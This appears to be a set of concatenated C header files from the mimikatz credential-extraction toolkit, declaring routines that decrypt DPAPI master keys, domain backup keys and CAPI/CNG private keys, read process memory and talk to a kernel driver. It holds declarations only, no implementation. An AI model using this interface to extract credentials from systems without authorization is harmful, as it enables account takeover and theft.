typedef struct _KULL_M_DPAPI_MASTERKEY_CREDHIST {
	DWORD	dwVersion;
	GUID	guid;
} KULL_M_DPAPI_MASTERKEY_CREDHIST, *PKULL_M_DPAPI_MASTERKEY_CREDHIST;

typedef struct _KULL_M_DPAPI_MASTERKEY_DOMAINKEY {
	DWORD	dwVersion;
	DWORD	dwSecretLen;
	DWORD	dwAccesscheckLen;
	GUID	guidMasterKey;
	PBYTE	pbSecret;
	PBYTE	pbAccesscheck;
} KULL_M_DPAPI_MASTERKEY_DOMAINKEY, *PKULL_M_DPAPI_MASTERKEY_DOMAINKEY;

typedef struct _KULL_M_DPAPI_MASTERKEYS {
	DWORD	dwVersion;
	DWORD	unk0;
	DWORD	unk1;
	WCHAR	szGuid[36];
	DWORD	unk2;
	DWORD	unk3;
	DWORD	dwFlags;
	DWORD64	dwMasterKeyLen;
	DWORD64 dwBackupKeyLen;
	DWORD64 dwCredHistLen;
	DWORD64	dwDomainKeyLen;
	PKULL_M_DPAPI_MASTERKEY	MasterKey;
	PKULL_M_DPAPI_MASTERKEY	BackupKey;
	PKULL_M_DPAPI_MASTERKEY_CREDHIST	CredHist;
	PKULL_M_DPAPI_MASTERKEY_DOMAINKEY	DomainKey;
} KULL_M_DPAPI_MASTERKEYS, *PKULL_M_DPAPI_MASTERKEYS;

typedef struct _KULL_M_DPAPI_DOMAIN_RSA_MASTER_KEY {
    DWORD  cbMasterKey;
    DWORD  cbSuppKey;
    BYTE   buffer[ANYSIZE_ARRAY];
} KULL_M_DPAPI_DOMAIN_RSA_MASTER_KEY, *PKULL_M_DPAPI_DOMAIN_RSA_MASTER_KEY;
 
typedef struct _KULL_M_DPAPI_DOMAIN_ACCESS_CHECK {
    DWORD  dwVersion;
    DWORD  dataLen;
    BYTE   data[ANYSIZE_ARRAY];
    // sid
    // SHA1 (or SHA512)
} KULL_M_DPAPI_DOMAIN_ACCESS_CHECK, *PKULL_M_DPAPI_DOMAIN_ACCESS_CHECK;



typedef struct _KULL_M_DPAPI_CREDHIST {
	KULL_M_DPAPI_CREDHIST_HEADER current;
	PKULL_M_DPAPI_CREDHIST_ENTRY * entries;
	DWORD __dwCount;
} KULL_M_DPAPI_CREDHIST, *PKULL_M_DPAPI_CREDHIST;
#pragma pack(pop) 

PKULL_M_DPAPI_BLOB kull_m_dpapi_blob_create(LPCVOID data/*, DWORD size*/);
void kull_m_dpapi_blob_delete(PKULL_M_DPAPI_BLOB blob);
void kull_m_dpapi_blob_descr(DWORD level, PKULL_M_DPAPI_BLOB blob);
void kull_m_dpapi_blob_quick_descr(DWORD level, LPCVOID data/*, DWORD size*/);

PKULL_M_DPAPI_MASTERKEYS kull_m_dpapi_masterkeys_create(LPCVOID data/*, DWORD size*/);
void kull_m_dpapi_masterkeys_delete(PKULL_M_DPAPI_MASTERKEYS masterkeys);
void kull_m_dpapi_masterkeys_descr(DWORD level, PKULL_M_DPAPI_MASTERKEYS masterkeys);
PBYTE kull_m_dpapi_masterkeys_tobin(PKULL_M_DPAPI_MASTERKEYS masterkeys, OPTIONAL DWORD64 *size);

PKULL_M_DPAPI_MASTERKEY kull_m_dpapi_masterkey_create(LPCVOID data, DWORD64 size);
void kull_m_dpapi_masterkey_delete(PKULL_M_DPAPI_MASTERKEY masterkey);
void kull_m_dpapi_masterkey_descr(DWORD level, PKULL_M_DPAPI_MASTERKEY masterkey);
PBYTE kull_m_dpapi_masterkey_tobin(PKULL_M_DPAPI_MASTERKEY masterkey, OPTIONAL DWORD64 *size);

PKULL_M_DPAPI_MASTERKEY_CREDHIST kull_m_dpapi_masterkeys_credhist_create(LPCVOID data, DWORD64 size);
void kull_m_dpapi_masterkeys_credhist_delete(PKULL_M_DPAPI_MASTERKEY_CREDHIST credhist);
void kull_m_dpapi_masterkeys_credhist_descr(DWORD level, PKULL_M_DPAPI_MASTERKEY_CREDHIST credhist);
PBYTE kull_m_dpapi_masterkeys_credhist_tobin(PKULL_M_DPAPI_MASTERKEY_CREDHIST credhist, OPTIONAL DWORD64 *size);

PKULL_M_DPAPI_MASTERKEY_DOMAINKEY kull_m_dpapi_masterkeys_domainkey_create(PVOID LPCVOID, DWORD64 size);
void kull_m_dpapi_masterkeys_domainkey_delete(PKULL_M_DPAPI_MASTERKEY_DOMAINKEY domainkey);
void kull_m_dpapi_masterkeys_domainkey_descr(DWORD level, PKULL_M_DPAPI_MASTERKEY_DOMAINKEY domainkey);
PBYTE kull_m_dpapi_masterkeys_domainkey_tobin(PKULL_M_DPAPI_MASTERKEY_DOMAINKEY domainkey, OPTIONAL DWORD64 *size);

PKULL_M_DPAPI_CREDHIST kull_m_dpapi_credhist_create(LPCVOID data, DWORD size);
void kull_m_dpapi_credhist_delete(PKULL_M_DPAPI_CREDHIST credhist);
void kull_m_dpapi_credhist_descr(DWORD level, PKULL_M_DPAPI_CREDHIST credhist);

PKULL_M_DPAPI_CREDHIST_ENTRY kull_m_dpapi_credhist_entry_create(LPCVOID data, DWORD size);
void kull_m_dpapi_credhist_entry_delete(PKULL_M_DPAPI_CREDHIST_ENTRY entry);
void kull_m_dpapi_credhist_entry_descr(DWORD level, PKULL_M_DPAPI_CREDHIST_ENTRY entry);

BOOL kull_m_dpapi_hmac_sha1_incorrect(LPCVOID key, DWORD keyLen, LPCVOID salt, DWORD saltLen, LPCVOID entropy, DWORD entropyLen, LPCVOID data, DWORD dataLen, LPVOID outKey);
BOOL kull_m_dpapi_sessionkey(LPCVOID masterkey, DWORD masterkeyLen, LPCVOID salt, DWORD saltLen, LPCVOID entropy, DWORD entropyLen, LPCVOID data, DWORD dataLen, ALG_ID hashAlg, LPVOID outKey, DWORD outKeyLen);
BOOL kull_m_dpapi_unprotect_blob(PKULL_M_DPAPI_BLOB blob, LPCVOID masterkey, DWORD masterkeyLen, LPCVOID entropy, DWORD entropyLen, LPCWSTR password, LPVOID *dataOut, DWORD *dataOutLen);
BOOL kull_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWSTR *ppszDataDescr, LPCVOID pOptionalEntropy, DWORD dwOptionalEntropyLen, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, LPVOID *pDataOut, DWORD *dwDataOutLen, LPCVOID pMasterKey, DWORD dwMasterKeyLen, LPCWSTR pPassword);

BOOL kull_m_dpapi_getProtected(PVOID PassHash, DWORD PassLen, PCWSTR sid);
BOOL kull_m_dpapi_unprotect_masterkey_with_password(DWORD flags, PKULL_M_DPAPI_MASTERKEY masterkey, PCWSTR password, PCWSTR sid, BOOL isKeyOfProtectedUser, PVOID *output, DWORD *outputLen);
BOOL kull_m_dpapi_unprotect_masterkey_with_userHash(PKULL_M_DPAPI_MASTERKEY masterkey, LPCVOID userHash, DWORD userHashLen, PCWSTR sid, BOOL isKeyOfProtectedUser, PVOID *output, DWORD *outputLen);
BOOL kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(PKULL_M_DPAPI_MASTERKEY masterkey, LPCVOID shaDerivedkey, DWORD shaDerivedkeyLen, PVOID *output, DWORD *outputLen);

BOOL kull_m_dpapi_protect_masterkey_with_password(DWORD flags, PKULL_M_DPAPI_MASTERKEY masterkey, PCWSTR password, PCWSTR sid, BOOL isKeyOfProtectedUser, LPCVOID pbKey, DWORD dwKey, OPTIONAL LPCVOID pbInternalSalt);
BOOL kull_m_dpapi_protect_masterkey_with_userHash(PKULL_M_DPAPI_MASTERKEY masterkey, LPCVOID userHash, DWORD userHashLen, PCWSTR sid, BOOL isKeyOfProtectedUser, LPCVOID pbKey, DWORD dwKey, OPTIONAL LPCVOID pbInternalSalt);
BOOL kull_m_dpapi_protect_masterkey_with_shaDerivedkey(PKULL_M_DPAPI_MASTERKEY masterkey, LPCVOID shaDerivedkey, DWORD shaDerivedkeyLen, LPCVOID pbKey, DWORD dwKey, OPTIONAL LPCVOID pbInternalSalt);

BOOL kull_m_dpapi_unprotect_backupkey_with_secret(DWORD flags, PKULL_M_DPAPI_MASTERKEY masterkey, PCWSTR sid, LPCVOID secret, DWORD secretLen, PVOID *output, DWORD *outputLen);
BOOL kull_m_dpapi_unprotect_domainkey_with_key(PKULL_M_DPAPI_MASTERKEY_DOMAINKEY domainkey, LPCVOID key, DWORD keyLen, PVOID *output, DWORD *outputLen, PSID *sid);
BOOL kull_m_dpapi_unprotect_domainkey_with_rpc(PKULL_M_DPAPI_MASTERKEYS masterkeys, PVOID rawMasterkeys, LPCWSTR server, PVOID *output, DWORD *outputLen);

BOOL kull_m_dpapi_unprotect_credhist_entry_with_shaDerivedkey(PKULL_M_DPAPI_CREDHIST_ENTRY entry, LPCVOID shaDerivedkey, DWORD shaDerivedkeyLen, PVOID md4hash, PVOID sha1hash);

void kull_m_dpapi_displayPromptFlags(DWORD flags);
void kull_m_dpapi_displayProtectionFlags(DWORD flags);
void kull_m_dpapi_displayBlobFlags(DWORD flags);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "kull_m_string.h"

BOOL isBase64InterceptOutput, isBase64InterceptInput;

typedef BOOL (CALLBACK * PKULL_M_FILE_FIND_CALLBACK) (DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg);

BOOL kull_m_file_getCurrentDirectory(wchar_t ** ppDirName);
BOOL kull_m_file_getAbsolutePathOf(PCWCHAR thisData, wchar_t ** reponse);
BOOL kull_m_file_isFileExist(PCWCHAR fileName);
BOOL kull_m_file_writeData(PCWCHAR fileName, LPCVOID data, DWORD lenght);
BOOL kull_m_file_readData(PCWCHAR fileName, PBYTE * data, PDWORD lenght);	// for 'little' files !
BOOL kull_m_file_readGeneric(PCWCHAR fileName, PBYTE * data, PDWORD lenght, DWORD flags);
void kull_m_file_cleanFilename(PWCHAR fileName);
PWCHAR kull_m_file_fullPath(PCWCHAR fileName);
BOOL kull_m_file_Find(PCWCHAR directory, PCWCHAR filter, BOOL isRecursive /*TODO*/, DWORD level, BOOL isPrintInfos, BOOL isWithDir, PKULL_M_FILE_FIND_CALLBACK callback, PVOID pvArg);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_process.h"

typedef enum _OBJECT_INFORMATION_CLASS
{
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectAllInformation,
	ObjectDataInformation
} OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	// ...
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG Reserved [22];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION
{
	ULONG Attributes;
	ACCESS_MASK GrantedAccess;
	ULONG HandleCount;
	ULONG PointerCount;
	ULONG PagedPoolCharge;
	ULONG NonPagedPoolCharge;
	ULONG Reserved[3];
	ULONG NameInfoSize;
	ULONG TypeInfoSize;
	ULONG SecurityDescriptorSize;
	LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _PUBLIC_OBJECT_BASIC_INFORMATION
{
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG Reserved[10];    // reserved for internal use
 } PUBLIC_OBJECT_BASIC_INFORMATION, *PPUBLIC_OBJECT_BASIC_INFORMATION;

extern NTSTATUS WINAPI NtQueryObject(IN OPTIONAL HANDLE Handle, IN OBJECT_INFORMATION_CLASS ObjectInformationClass, OUT OPTIONAL PVOID ObjectInformation, IN ULONG ObjectInformationLength, OUT OPTIONAL PULONG ReturnLength);

typedef struct _SYSTEM_HANDLE
{
	DWORD ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	DWORD HandleCount;
	SYSTEM_HANDLE Handles[ANYSIZE_ARRAY];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef BOOL (CALLBACK * PKULL_M_SYSTEM_HANDLE_ENUM_CALLBACK) (PSYSTEM_HANDLE pSystemHandle, PVOID pvArg);
typedef BOOL (CALLBACK * PKULL_M_HANDLE_ENUM_CALLBACK) (HANDLE handle, PSYSTEM_HANDLE pSystemHandle, PVOID pvArg);

typedef struct _HANDLE_ENUM_DATA
{
	PCUNICODE_STRING type;
	DWORD dwDesiredAccess;
	DWORD dwOptions;
	PKULL_M_HANDLE_ENUM_CALLBACK callBack;
	PVOID pvArg;
} HANDLE_ENUM_DATA, *PHANDLE_ENUM_DATA;

NTSTATUS kull_m_handle_getHandles(PKULL_M_SYSTEM_HANDLE_ENUM_CALLBACK callBack, PVOID pvArg);
NTSTATUS kull_m_handle_getHandlesOfType(PKULL_M_HANDLE_ENUM_CALLBACK callBack, LPCTSTR type, DWORD dwDesiredAccess, DWORD dwOptions, PVOID pvArg);

BOOL CALLBACK kull_m_handle_getHandlesOfType_callback(PSYSTEM_HANDLE pSystemHandle, PVOID pvArg);

BOOL kull_m_handle_GetUserObjectInformation(HANDLE hObj, int nIndex, PVOID *pvInfo, PDWORD nLength);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"





extern void __stdcall HidD_GetHidGuid(__out LPGUID HidGuid);
extern NTSTATUS __stdcall HidP_GetCaps(__in PHIDP_PREPARSED_DATA PreparsedData, __out PHIDP_CAPS Capabilities);
extern BOOLEAN __stdcall HidD_GetAttributes(__in HANDLE HidDeviceObject, __out PHIDD_ATTRIBUTES Attributes);
extern BOOLEAN __stdcall HidD_GetPreparsedData(__in HANDLE HidDeviceObject, __out PHIDP_PREPARSED_DATA * PreparsedData);
extern BOOLEAN __stdcall HidD_FreePreparsedData(__in PHIDP_PREPARSED_DATA PreparsedData);
extern BOOLEAN __stdcall HidD_SetFeature(__in HANDLE HidDeviceObject, __in PVOID ReportBuffer, __in ULONG ReportBufferLength);
extern BOOLEAN __stdcall HidD_GetFeature(__in HANDLE HidDeviceObject, __out PVOID ReportBuffer, __in ULONG ReportBufferLength);

#define DIGCF_DEFAULT           0x00000001  // only valid with DIGCF_DEVICEINTERFACE
#define DIGCF_PRESENT           0x00000002
#define DIGCF_ALLCLASSES        0x00000004
#define DIGCF_PROFILE           0x00000008
#define DIGCF_DEVICEINTERFACE   0x00000010

#define WINSETUPAPI DECLSPEC_IMPORT
typedef PVOID HDEVINFO;

typedef struct _SP_DEVINFO_DATA {
	DWORD cbSize;
	GUID  ClassGuid;
	DWORD DevInst;    // DEVINST handle
	ULONG_PTR Reserved;
} SP_DEVINFO_DATA, *PSP_DEVINFO_DATA;

typedef struct _SP_DEVICE_INTERFACE_DATA {
	DWORD cbSize;
	GUID  InterfaceClassGuid;
	DWORD Flags;
	ULONG_PTR Reserved;
} SP_DEVICE_INTERFACE_DATA, *PSP_DEVICE_INTERFACE_DATA;

typedef struct _SP_DEVICE_INTERFACE_DETAIL_DATA_W {
	DWORD  cbSize;
	WCHAR  DevicePath[ANYSIZE_ARRAY];
} SP_DEVICE_INTERFACE_DETAIL_DATA_W, *PSP_DEVICE_INTERFACE_DETAIL_DATA_W, SP_DEVICE_INTERFACE_DETAIL_DATA, *PSP_DEVICE_INTERFACE_DETAIL_DATA;

extern WINSETUPAPI HDEVINFO WINAPI SetupDiGetClassDevsW(__in_opt CONST GUID *ClassGuid, __in_opt PCWSTR Enumerator, __in_opt HWND hwndParent, __in DWORD Flags);
extern WINSETUPAPI BOOL WINAPI SetupDiEnumDeviceInterfaces(__in HDEVINFO DeviceInfoSet, __in_opt PSP_DEVINFO_DATA DeviceInfoData, __in CONST GUID *InterfaceClassGuid, __in DWORD MemberIndex, __out PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData);
extern WINSETUPAPI BOOL WINAPI SetupDiGetDeviceInterfaceDetailW( __in HDEVINFO DeviceInfoSet, __in PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData, __out_bcount_opt(DeviceInterfaceDetailDataSize) PSP_DEVICE_INTERFACE_DETAIL_DATA_W DeviceInterfaceDetailData, __in DWORD DeviceInterfaceDetailDataSize, __out_opt PDWORD RequiredSize,  __out_opt PSP_DEVINFO_DATA DeviceInfoData);
extern WINSETUPAPI BOOL WINAPI SetupDiDestroyDeviceInfoList(__in HDEVINFO DeviceInfoSet);
extern WINSETUPAPI BOOL SetupDiGetDeviceRegistryPropertyW(__in HDEVINFO DeviceInfoSet, __in PSP_DEVINFO_DATA DeviceInfoData, __in DWORD Property, __out_opt PDWORD PropertyRegDataType, __out_opt PBYTE PropertyBuffer, __in DWORD PropertyBufferSize, __out_opt PDWORD RequiredSize);
extern WINSETUPAPI BOOL SetupDiEnumDeviceInfo(__in HDEVINFO DeviceInfoSet, __in DWORD MemberIndex, __out PSP_DEVINFO_DATA DeviceInfoData);

#define SetupDiGetClassDevs SetupDiGetClassDevsW
#define SetupDiGetDeviceInterfaceDetail SetupDiGetDeviceInterfaceDetailW
#define SetupDiGetDeviceRegistryProperty SetupDiGetDeviceRegistryPropertyW


/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "../mimidrv/ioctl.h"

BOOL kull_m_kernel_ioctl_handle(HANDLE hDriver, DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID * pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer);
BOOL kull_m_kernel_ioctl(PCWSTR driver, DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID * pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer);
BOOL kull_m_kernel_mimidrv_ioctl(DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID * pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer);
BOOL kull_m_kernel_mimidrv_simple_output(DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_dpapi.h"
//#include "kull_m_string.h"

#define KIWI_DPAPI_ENTROPY_CAPI_KEY_EXPORTFLAGS	"Hj1diQ6kpUx7VC4m"
#define KIWI_DPAPI_ENTROPY_CNG_KEY_PROPERTIES	"6jnkd5J3ZdQDtrsu"
#define KIWI_DPAPI_ENTROPY_CNG_KEY_BLOB			"xT5rZW5qVVbrvpuA"

//#define KIWI_DPAPI_ENTROPY_NGC_unk				0x62 6B ED CB CA 02 5E 41  84 7E 33 93 36 9C 2E 5E

#pragma pack(push, 4) 
typedef struct _KULL_M_KEY_CAPI_BLOB {
	DWORD	dwVersion;
	DWORD	unk0;	// maybe flags somewhere ?
	DWORD	dwNameLen;
	DWORD	dwSiPublicKeyLen;
	DWORD	dwSiPrivateKeyLen;
	DWORD	dwExPublicKeyLen;
	DWORD	dwExPrivateKeyLen;
	DWORD	dwHashLen; // hmac ?
	DWORD	dwSiExportFlagLen;
	DWORD	dwExExportFlagLen;

	PSTR	pName;
	PVOID	pHash;
	PVOID	pSiPublicKey;
	PVOID	pSiPrivateKey;
	PVOID	pSiExportFlag;
	PVOID	pExPublicKey;
	PVOID	pExPrivateKey;
	PVOID	pExExportFlag;
} KULL_M_KEY_CAPI_BLOB, *PKULL_M_KEY_CAPI_BLOB;

typedef struct _KULL_M_KEY_CNG_PROPERTY {
	DWORD	dwStructLen;
	DWORD	type;
	DWORD	unk;
	DWORD	dwNameLen;
	DWORD	dwPropertyLen;

	PSTR	pName;
	PVOID	pProperty;
} KULL_M_KEY_CNG_PROPERTY, *PKULL_M_KEY_CNG_PROPERTY;

typedef struct _KULL_M_KEY_CNG_BLOB {
	DWORD	dwVersion;
	DWORD	unk;	// maybe flags somewhere ?
	DWORD	dwNameLen;
	DWORD	type;
	DWORD	dwPublicPropertiesLen;
	DWORD	dwPrivatePropertiesLen;
	DWORD	dwPrivateKeyLen;
	BYTE	unkArray[16];

	PSTR	pName;
	
	DWORD						cbPublicProperties;
	PKULL_M_KEY_CNG_PROPERTY	*pPublicProperties;
	
	PVOID	pPrivateProperties;
	PVOID	pPrivateKey;
} KULL_M_KEY_CNG_BLOB, *PKULL_M_KEY_CNG_BLOB;
#pragma pack(pop)

PKULL_M_KEY_CAPI_BLOB kull_m_key_capi_create(PVOID data/*, DWORD size*/);
void kull_m_key_capi_delete(PKULL_M_KEY_CAPI_BLOB capiKey);
void kull_m_key_capi_descr(DWORD level, PKULL_M_KEY_CAPI_BLOB capiKey);
BOOL kull_m_key_capi_write(PKULL_M_KEY_CAPI_BLOB capiKey, PVOID *data, DWORD *size);
BOOL kull_m_key_capi_decryptedkey_to_raw(LPCVOID publickey, DWORD publickeyLen, LPCVOID decrypted, DWORD decryptedLen, ALG_ID keyAlg, PRSA_GENERICKEY_BLOB *blob, DWORD *blobLen, DWORD *dwProviderType);

PKULL_M_KEY_CNG_BLOB kull_m_key_cng_create(PVOID data/*, DWORD size*/);
void kull_m_key_cng_delete(PKULL_M_KEY_CNG_BLOB cngKey);
void kull_m_key_cng_descr(DWORD level, PKULL_M_KEY_CNG_BLOB cngKey);
//
PKULL_M_KEY_CNG_PROPERTY kull_m_key_cng_property_create(PVOID data/*, DWORD size*/);
void kull_m_key_cng_property_delete(PKULL_M_KEY_CNG_PROPERTY property);
void kull_m_key_cng_property_descr(DWORD level, PKULL_M_KEY_CNG_PROPERTY property);
//
BOOL kull_m_key_cng_properties_create(PVOID data, DWORD size, PKULL_M_KEY_CNG_PROPERTY ** properties, DWORD *count);
void kull_m_key_cng_properties_delete(PKULL_M_KEY_CNG_PROPERTY *properties, DWORD count);
void kull_m_key_cng_properties_descr(DWORD level, PKULL_M_KEY_CNG_PROPERTY *properties, DWORD count);
//

#if !defined(BCRYPT_PCP_KEY_MAGIC)
#define BCRYPT_PCP_KEY_MAGIC 'MPCP' // Platform Crypto Provider Magic

#define PCPTYPE_TPM12 (0x00000001)
#define PCPTYPE_TPM20 (0x00000002)

typedef enum PCP_KEY_FLAGS_WIN8 {
	PCP_KEY_FLAGS_WIN8_authRequired = 0x00000001
} PCP_KEY_FLAGS_WIN8;

typedef enum PCP_KEY_FLAGS {
	PCP_KEY_FLAGS_authRequired = 0x00000001
} PCP_KEY_FLAGS;

typedef struct PCP_KEY_BLOB_WIN8 { // Storage structure for 2.0 keys
	DWORD   magic;
	DWORD   cbHeader;
	DWORD   pcpType;
	DWORD   flags;
	ULONG   cbPublic;
	ULONG   cbPrivate;
	ULONG   cbMigrationPublic;
	ULONG   cbMigrationPrivate;
	ULONG   cbPolicyDigestList;
	ULONG   cbPCRBinding;
	ULONG   cbPCRDigest;
	ULONG   cbEncryptedSecret;
	ULONG   cbTpm12HostageBlob;
} PCP_KEY_BLOB_WIN8, *PPCP_KEY_BLOB_WIN8;

typedef struct PCP_20_KEY_BLOB { // Storage structure for 2.0 keys
	DWORD   magic;
	DWORD   cbHeader;
	DWORD   pcpType;
	DWORD   flags;
	ULONG   cbPublic;
	ULONG   cbPrivate; 
	ULONG   cbMigrationPublic;
	ULONG   cbMigrationPrivate;
	ULONG   cbPolicyDigestList;
	ULONG   cbPCRBinding;
	ULONG   cbPCRDigest;
	ULONG   cbEncryptedSecret;
	ULONG   cbTpm12HostageBlob;
	USHORT  pcrAlgId;
} PCP_20_KEY_BLOB, *PPCP_20_KEY_BLOB;

typedef struct PCP_KEY_BLOB {
	DWORD   magic;
	DWORD   cbHeader;
	DWORD   pcpType;
	DWORD   flags;
	ULONG   cbTpmKey;
} PCP_KEY_BLOB, *PPCP_KEY_BLOB;
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "kull_m_string.h"

BOOL kull_m_ldap_getLdapAndRootDN(PCWCHAR system, PCWCHAR nc, PLDAP *ld, PWCHAR *rootDn, PSEC_WINNT_AUTH_IDENTITY pIdentity);
PWCHAR kull_m_ldap_getRootDomainNamingContext(PCWCHAR nc, LDAP *ld);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_minidump.h"
//#include "kull_m_kernel.h"


BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length);
BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst);

BOOL kull_m_memory_query(IN PKULL_M_MEMORY_ADDRESS Address, OUT PMEMORY_BASIC_INFORMATION MemoryInfo);
BOOL kull_m_memory_protect(IN PKULL_M_MEMORY_ADDRESS Address, IN SIZE_T dwSize, IN DWORD flNewProtect, OUT OPTIONAL PDWORD lpflOldProtect);

BOOL kull_m_memory_open(IN KULL_M_MEMORY_TYPE Type, IN HANDLE hAny, OUT PKULL_M_MEMORY_HANDLE *hMemory);
PKULL_M_MEMORY_HANDLE kull_m_memory_close(IN PKULL_M_MEMORY_HANDLE hMemory);

BOOL kull_m_memory_alloc(IN PKULL_M_MEMORY_ADDRESS Address, IN SIZE_T Lenght, IN DWORD Protection);
BOOL kull_m_memory_free(IN PKULL_M_MEMORY_ADDRESS Address);
BOOL kull_m_memory_equal(IN PKULL_M_MEMORY_ADDRESS Address1, IN PKULL_M_MEMORY_ADDRESS Address2, IN SIZE_T Lenght);

#define COMPRESSION_FORMAT_NONE          (0x0000)   // winnt
#define COMPRESSION_FORMAT_DEFAULT       (0x0001)   // winnt
#define COMPRESSION_FORMAT_LZNT1         (0x0002)   // winnt

#define COMPRESSION_ENGINE_STANDARD      (0x0000)   // winnt
#define COMPRESSION_ENGINE_MAXIMUM       (0x0100)   // winnt
#define COMPRESSION_ENGINE_HIBER         (0x0200)   // winnt

NTSYSAPI NTSTATUS NTAPI RtlGetCompressionWorkSpaceSize (__in USHORT CompressionFormatAndEngine, __out PULONG CompressBufferWorkSpaceSize, __out PULONG CompressFragmentWorkSpaceSize);
NTSYSAPI NTSTATUS NTAPI RtlCompressBuffer (__in USHORT CompressionFormatAndEngine, __in_bcount(UncompressedBufferSize) PUCHAR UncompressedBuffer, __in ULONG UncompressedBufferSize, __out_bcount_part(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer, __in ULONG CompressedBufferSize, __in ULONG UncompressedChunkSize, __out PULONG FinalCompressedSize, __in PVOID WorkSpace);
NTSYSAPI NTSTATUS NTAPI RtlDecompressBuffer (__in USHORT CompressionFormat, __out_bcount_part(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer, __in ULONG UncompressedBufferSize, __in_bcount(CompressedBufferSize) PUCHAR CompressedBuffer, __in ULONG CompressedBufferSize, __out PULONG FinalUncompressedSize );

BOOL kull_m_memory_quick_compress(IN PVOID data, IN DWORD size, IN OUT PVOID *compressedData, IN OUT PDWORD compressedSize);
BOOL kull_m_memory_quick_decompress(IN PVOID data, IN DWORD size, IN OPTIONAL DWORD originalSize, IN OUT PVOID *decompressedData, IN OUT PDWORD decompressedSize);

void kull_m_memory_reverseBytes(PVOID start, SIZE_T size);
#if defined(_M_ARM64)
PVOID kull_m_memory_arm64_AddrFromInstr(PVOID cur, ULONG i1, ULONG i2);
PVOID kull_m_memory_arm64_getRealAddress(PKULL_M_MEMORY_ADDRESS Address, LONG off);
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

#define MIFARE_CLASSIC_KEY_SIZE						6
#define MIFARE_CLASSIC_SECTORS						16
#define MIFARE_CLASSIC_BLOCKS_PER_SECTOR			4
#define MIFARE_CLASSIC_BLOCK_SIZE					16
#define MIFARE_CLASSIC_UID_SIZE						4	// ok, I know about 7 or 10 too...

